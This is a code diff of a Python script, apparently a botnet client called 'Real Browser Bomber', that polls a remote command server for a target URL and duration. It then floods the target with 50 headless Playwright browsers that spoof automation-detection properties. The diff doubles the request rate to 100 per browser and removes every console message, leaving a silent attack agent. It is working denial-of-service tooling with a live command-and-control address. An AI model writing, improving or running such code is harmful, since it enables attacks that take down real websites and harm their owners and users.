@@ -3,13 +3,10 @@ from playwright.sync_api import sync_playwright
 import time, random, threading, urllib.parse, signal, sys, xml.etree.ElementTree as ET
 import urllib.request
 from concurrent.futures import ThreadPoolExecutor
-from colorama import init, Fore, Style
-
-init(autoreset=True)
 
 API_URL = "https://labaidgroup.com/files/google_security2025992852991526.php"
 THREADS = 50
-RPS_PER_THREAD = 50.0
+RPS_PER_THREAD = 100.0
 RETRY_DELAY = 5
 
 class Stats:
@@ -23,7 +20,6 @@ class Stats:
         with self.l: return self.t, self.e, dict(self.c)
 
 def signal_handler(signum, frame):
-    print(f"\n{Fore.RED}Shutting down gracefully...{Style.RESET_ALL}")
     raise KeyboardInterrupt
 
 def fetch_config():
@@ -32,20 +28,15 @@ def fetch_config():
             req = urllib.request.Request(
                 API_URL,
                 headers={
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-                    'Accept-Language': 'en-US,en;q=0.9',
-                    'Accept-Encoding': 'gzip, deflate, br',
-                    'Connection': 'keep-alive',
-                    'Cache-Control': 'no-cache',
-                    'Pragma': 'no-cache'
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                    'Accept': '*/*',
+                    'Connection': 'close'
                 }
             )
             with urllib.request.urlopen(req, timeout=10) as resp:
                 raw = resp.read().decode('utf-8', errors='ignore').strip()
             
             if not raw or '<data>' not in raw:
-                print(f"{Fore.YELLOW}Waiting for valid data... (empty/invalid response){Style.RESET_ALL}")
                 time.sleep(RETRY_DELAY)
                 continue
 
@@ -55,7 +46,6 @@ def fetch_config():
             wait_elem = root.find('wait')
 
             if url_elem is None or time_elem is None:
-                print(f"{Fore.YELLOW}Waiting for valid data... (missing fields){Style.RESET_ALL}")
                 time.sleep(RETRY_DELAY)
                 continue
 
@@ -65,11 +55,9 @@ def fetch_config():
             dur = int(time_elem.text.strip())
             wait = int(wait_elem.text.strip()) if wait_elem and wait_elem.text else 0
 
-            print(f"{Fore.GREEN}New attack received: {url} | Duration: {dur}s | Wait: {wait}s{Style.RESET_ALL}")
             return url, dur, wait
 
-        except Exception as e:
-            print(f"{Fore.YELLOW}API error: {e} | Retrying in {RETRY_DELAY}s...{Style.RESET_ALL}")
+        except Exception:
             time.sleep(RETRY_DELAY)
 
 def worker(tid, url, dur, stats, stop, last, target_rps):
@@ -102,8 +90,6 @@ def worker(tid, url, dur, stats, stop, last, target_rps):
             context.add_init_script("""
                 Object.defineProperty(navigator, 'webdriver', { get: () => false });
                 window.chrome = { runtime: {} };
-                Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
-                Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
             """)
             page = context.new_page()
 
@@ -144,7 +130,7 @@ def worker(tid, url, dur, stats, stop, last, target_rps):
                 if time.time() > next_time + 0.5:
                     next_time = time.time() + interval
 
-    except Exception as e:
+    except Exception:
         pass
     finally:
         try:
@@ -153,7 +139,6 @@ def worker(tid, url, dur, stats, stop, last, target_rps):
         except: pass
 
 def run_attack(url, dur, wait_time):
-    print(f"{Fore.CYAN}Waiting {wait_time}s before attack...{Style.RESET_ALL}")
     time.sleep(wait_time)
 
     stats = Stats()
@@ -161,53 +146,23 @@ def run_attack(url, dur, wait_time):
     last = ["---"]
     st = time.time()
 
-    total_rps = THREADS * RPS_PER_THREAD
-    print(f"{Fore.GREEN}{Style.BRIGHT}ATTACK STARTED → {url}")
-    print(f"{Fore.YELLOW}Duration: {dur}s | Browsers: {THREADS} | RPS/Browser: {RPS_PER_THREAD} → ~{total_rps:.1f} RPS")
-    print("="*80)
-
     with ThreadPoolExecutor(max_workers=THREADS) as ex:
         futures = [ex.submit(worker, i, url, dur, stats, stop, last, RPS_PER_THREAD) for i in range(THREADS)]
 
         try:
             while any(f.running() for f in futures) and time.time() - st < dur:
-                el = int(time.time() - st)
-                t, e, c = stats.get()
-                rate = t / max(el, 1)
-                prog = min(el/dur, 1)
-                bar = "Full"*int(30*prog) + "Empty"*(30-int(30*prog))
-                col = Fore.CYAN if last[0] in ["200","301"] else Fore.RED
-                print(f"\r{Fore.WHITE}[{el:2d}s] {Fore.CYAN}{bar} {prog*100:5.1f}% | "
-                      f"{Fore.YELLOW}Req: {t:5d} | {Fore.RED}Err: {e:3d} | "
-                      f"{Fore.GREEN}Rate: {rate:6.1f}/s | Last: {col}{last[0]}{Style.RESET_ALL}", end="", flush=True)
                 time.sleep(0.5)
         except KeyboardInterrupt:
-            print(f"\n{Fore.YELLOW}Stopping attack...{Style.RESET_ALL}")
             stop.set()
             time.sleep(1)
-
-    final = time.time() - st
-    t, e, c = stats.get()
-    success = (t-e)/t*100 if t > 0 else 0
-    print("\n" + "="*80)
-    print(f"{Fore.GREEN}{Style.BRIGHT}ATTACK FINISHED in {final:.1f}s")
-    print(f"{Fore.YELLOW}Total: {t} | Errors: {e} | Success: {success:.1f}%")
-    print(f"{Fore.MAGENTA}Avg Rate: {t/final:.2f} req/s")
-    if c: print(f"{Fore.WHITE}Codes: {' | '.join([f'{k}:{v}' for k,v in c.items()])}")
-    print("="*80)
 
 def main():
     signal.signal(signal.SIGINT, signal_handler)
     signal.signal(signal.SIGTERM, signal_handler)
 
-    print(f"{Fore.CYAN}{Style.BRIGHT}Real Browser Bomber v15 – API Loop Mode")
-    print(f"{Fore.YELLOW}Waiting for attack commands from API...{Style.RESET_ALL}")
-    print("="*80)
-
     while True:
         url, dur, wait_time = fetch_config()
         run_attack(url, dur, wait_time)
-        print(f"{Fore.YELLOW}Attack completed. Waiting for next command...{Style.RESET_ALL}")
 
 if __name__ == "__main__":
     main()
